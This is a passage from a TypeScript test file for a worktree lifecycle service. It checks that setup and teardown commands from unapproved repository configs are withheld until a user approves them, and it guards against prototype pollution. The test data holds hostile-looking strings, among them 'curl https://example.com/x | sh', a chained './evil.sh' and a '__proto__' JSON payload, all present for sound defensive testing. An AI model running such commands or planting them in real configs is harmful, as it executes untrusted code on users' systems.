        setResourceConnectCommand: vi.fn(),
        setResourcePollInterval: vi.fn(),
      };
      return monitor;
    }

    function makeCtx(monitor: ReturnType<typeof makeMonitor>) {
      return {
        projectRootPath: ROOT,
        projectEnvVars: {},
        getMonitor: () => monitor as never,
        emitUpdate: vi.fn(),
      } as unknown as import("../WorktreeLifecycleService.js").WorkspaceHostContext;
    }

    /** Serve config files by path suffix; everything else is missing. A string is served raw. */
    function serveFiles(files: Record<string, unknown>) {
      const lookup = (p: unknown) =>
        Object.entries(files).find(([suffix]) => n(p as string).endsWith(suffix))?.[1];
      mockAccess.mockImplementation(async (p: unknown) => {
        if (lookup(p) === undefined) throw new Error("ENOENT");
      });
      mockReadFile.mockImplementation(async (p: unknown) => {
        const content = lookup(p);
        if (content === undefined) throw new Error("ENOENT");
        return (typeof content === "string" ? content : JSON.stringify(content)) as never;
      });
    }

    function spawnSucceeds() {
      mockSpawn.mockImplementation(() => {
        const child = {
          pid: 1234,
          stdout: { on: vi.fn() },
          stderr: { on: vi.fn() },
          on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
            if (event === "close") setTimeout(() => cb(0), 0);
          }),
          kill: vi.fn(),
        };
        return child as never;
      });
    }

    let ownResource: typeof import("../WorktreeLifecycleService.js").ownResource;

    beforeEach(async () => {
      approved = new Set();
      const lifecycleModule = await import("../WorktreeLifecycleService.js");
      ownResource = lifecycleModule.ownResource;
      const { WorktreeLifecycleService } = lifecycleModule;
      service = new WorktreeLifecycleService("/home/testuser", {
        isApproved: async (_root, fingerprint) => approved.has(fingerprint),
        approve: async (_root, fingerprints) => {
          for (const fingerprint of fingerprints) approved.add(fingerprint);
        },
      });
      spawnSucceeds();
    });

    async function approveCurrentReview() {
      const review = await service.getCommandReview(WT, ROOT);
      expect(review).not.toBeNull();
      await service.approveCommandReview(WT, ROOT, review!.fingerprint);
    }

    it("skips a branch's unapproved setup commands and says so", async () => {
      serveFiles({
        "/wt/.daintree/config.json": {
          setup: ["curl https://example.com/x | sh"],
          resource: { connect: "ssh {{branch}}.example.com" },
        },
      });
      const monitor = makeMonitor();

      const result = await service.runLifecycleSetup("wt-1", WT, makeCtx(monitor), true);

      expect(result).toEqual({ shouldProvision: false, needsApproval: true });
      expect(mockSpawn).not.toHaveBeenCalled();
      expect(monitor.lifecycleStatus).toMatchObject({ phase: "setup", state: "needs-approval" });
      expect(monitor.needsApproval).toBe(true);
      // The connect command is from the same unapproved file, so it is withheld.
      expect(monitor.setResourceConnectCommand).toHaveBeenLastCalledWith(undefined);
    });

    it("runs setup commands from the user's own config without asking", async () => {
      serveFiles({
        "/home/testuser/.daintree/projects/_root/config.json": { setup: ["npm install"] },
        "/wt/.daintree/config.json": { setup: ["curl https://example.com/x | sh"] },
      });
      const monitor = makeMonitor();

      const result = await service.runLifecycleSetup("wt-1", WT, makeCtx(monitor), false);

      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
      expect(mockSpawn).toHaveBeenCalledTimes(1);
      expect(mockSpawn.mock.calls[0]![0]).toBe("npm install");
      expect(await service.getCommandReview(WT, ROOT)).toBeNull();
    });

    it("runs approved commands, and asks again once they change", async () => {
      const config = { setup: ["npm install"] };
      serveFiles({ "/root/.daintree/config.json": config });
      await approveCurrentReview();

      const first = await service.runLifecycleSetup("wt-1", WT, makeCtx(makeMonitor()), false);
      expect(first.needsApproval).toBe(false);
      expect(mockSpawn).toHaveBeenCalledTimes(1);

      mockSpawn.mockClear();
      serveFiles({ "/wt/.daintree/config.json": { setup: ["npm install", "./evil.sh"] } });
      const second = await service.runLifecycleSetup("wt-1", WT, makeCtx(makeMonitor()), false);
      expect(second.needsApproval).toBe(true);
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it("treats the same commands on another branch as already approved", async () => {
      serveFiles({ "/root/.daintree/config.json": { setup: ["npm install"] } });
      await approveCurrentReview();

      // A new worktree carries its own copy of the file at a different path.
      serveFiles({ "/wt/.daintree/config.json": { setup: ["npm install"] } });
      const result = await service.runLifecycleSetup("wt-1", WT, makeCtx(makeMonitor()), false);

      expect(result.needsApproval).toBe(false);
      expect(mockSpawn).toHaveBeenCalledTimes(1);
    });

    it("holds setup back when the provision it leads into comes from unapproved settings", async () => {
      serveFiles({
        "/home/testuser/.daintree/projects/_root/config.json": { setup: ["npm install"] },
        "/root/.daintree/settings.json": {
          resourceEnvironments: { cloud: { provision: ["terraform apply"] } },
        },
      });
      const monitor = makeMonitor({ worktreeMode: "cloud" });

      const result = await service.runLifecycleSetup("wt-1", WT, makeCtx(monitor), true);

      expect(result).toEqual({ shouldProvision: false, needsApproval: true });
      expect(mockSpawn).not.toHaveBeenCalled();
      const review = await service.getCommandReview(WT, ROOT);
      expect(review?.sources.map((source) => n(source.path))).toEqual([
        "/root/.daintree/settings.json",
      ]);
    });

    it("never resolves a settings environment the review cannot list", async () => {
      // Raw JSON: an object literal would turn `__proto__` into a prototype
      // before it ever reached the file.
      serveFiles({
        // A config with no resource block of its own, so resolution falls
        // through to the settings environments.
        "/wt/.daintree/config.json": {},
        "/root/.daintree/settings.json":
          '{"resourceEnvironments":{"plain":{},"__proto__":{"provision":["id"],"status":"id"}}}',
      });
      const monitor = makeMonitor({ worktreeMode: "__proto__" });

      const result = await service.runLifecycleSetup("wt-1", WT, makeCtx(monitor), true);
      const environments = (await service.resolveProjectResourceEnvironments(ROOT))?.environments;

      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
      expect(Object.getPrototypeOf(environments)).toBe(Object.prototype);
      expect(Object.keys(environments ?? {})).toEqual(["plain"]);
      expect(ownResource(environments, "__proto__")).toBeUndefined();
      expect(ownResource(environments, "constructor")).toBeUndefined();
      expect(monitor.hasResourceConfig).toBe(false);
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it("asks about settings environments when the config's resources resolve nothing", async () => {
      serveFiles({
        "/wt/.daintree/config.json": { resources: {} },
        "/root/.daintree/settings.json": {
          resourceEnvironments: { cloud: { status: "cloud-status" } },
        },
      });

      const review = await service.getCommandReview(WT, ROOT);

      expect(review?.sources.map((source) => n(source.path))).toEqual([
        "/root/.daintree/settings.json",
      ]);
    });

    it("keeps an unapproved settings provider out of an approved setup's environment", async () => {
      serveFiles({
        "/home/testuser/.daintree/projects/_root/config.json": {
          setup: ["$DAINTREE_RESOURCE_PROVIDER"],
        },
        "/root/.daintree/settings.json": {
          resourceEnvironments: { cloud: { provider: "sh -c id", status: "check" } },
        },
      });
      const monitor = makeMonitor({ worktreeMode: "cloud" });

      await service.runLifecycleSetup("wt-1", WT, makeCtx(monitor), false);

      expect(mockSpawn).toHaveBeenCalledTimes(1);
      const spawnOptions = mockSpawn.mock.calls[0]![1] as { env: Record<string, string> };
      expect(spawnOptions.env.DAINTREE_RESOURCE_PROVIDER).toBeUndefined();
    });

    it("refuses an approval for commands that changed after review", async () => {
      serveFiles({ "/wt/.daintree/config.json": { setup: ["npm install"] } });
      const review = await service.getCommandReview(WT, ROOT);

      serveFiles({ "/wt/.daintree/config.json": { setup: ["npm install && ./evil.sh"] } });

      await expect(service.approveCommandReview(WT, ROOT, review!.fingerprint)).rejects.toThrow(
        /changed/
      );
      expect(approved.size).toBe(0);
    });

    it("shows every command group of the file under review", async () => {
      serveFiles({
        "/wt/.daintree/config.json": {
          setup: ["npm install"],
          teardown: ["docker compose down"],
          resources: { gpu: { status: "gpu-status" } },
        },
        // Shadowed by the config's own resource block, so never consulted.
        "/root/.daintree/settings.json": {
          resourceEnvironments: { cloud: { provision: ["terraform apply"] } },
        },
      });

      const review = await service.getCommandReview(WT, ROOT);

      expect(review?.sources).toHaveLength(1);
      expect(review?.sources[0]!.groups).toEqual([
        { label: "Setup", commands: ["npm install"] },
        { label: "Teardown", commands: ["docker compose down"] },
        { label: 'Resource "gpu" status', commands: ["gpu-status"] },
      ]);
    });

    it("skips unapproved teardown phases without blocking deletion", async () => {
      serveFiles({
        "/wt/.daintree/config.json": {
          teardown: ["docker compose down"],
          resource: { teardown: ["terraform destroy"] },
        },
      });
      const monitor = makeMonitor({ hasResourceConfig: true });

      await expect(
        service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor))
      ).resolves.toBeUndefined();

      expect(mockSpawn).not.toHaveBeenCalled();
      expect(monitor.lifecyclePhaseResults.map((r) => [r.phase, r.state, r.category])).toEqual([
        ["resource-teardown", "needs-approval", "billing-critical"],
        ["teardown", "needs-approval", "cosmetic"],
      ]);
      expect(monitor.needsApproval).toBe(true);
    });

    it("runs approved teardown commands", async () => {
      serveFiles({ "/wt/.daintree/config.json": { teardown: ["docker compose down"] } });
      await approveCurrentReview();
      const monitor = makeMonitor();

      await service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor));

      expect(mockSpawn).toHaveBeenCalledTimes(1);
      expect(monitor.lifecyclePhaseResults[0]).toMatchObject({
        phase: "teardown",
        state: "success",
      });
    });

    it("fails closed when the approval store throws", async () => {
      const { WorktreeLifecycleService } = await import("../WorktreeLifecycleService.js");
      service = new WorktreeLifecycleService("/home/testuser", {
        isApproved: async () => {
          throw new Error("disk gone");
        },
        approve: async () => {},
      });
      serveFiles({ "/wt/.daintree/config.json": { teardown: ["docker compose down"] } });
      const monitor = makeMonitor();

      await service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor));

      expect(mockSpawn).not.toHaveBeenCalled();
      expect(monitor.lifecyclePhaseResults[0]?.state).toBe("needs-approval");
    });
  });
});
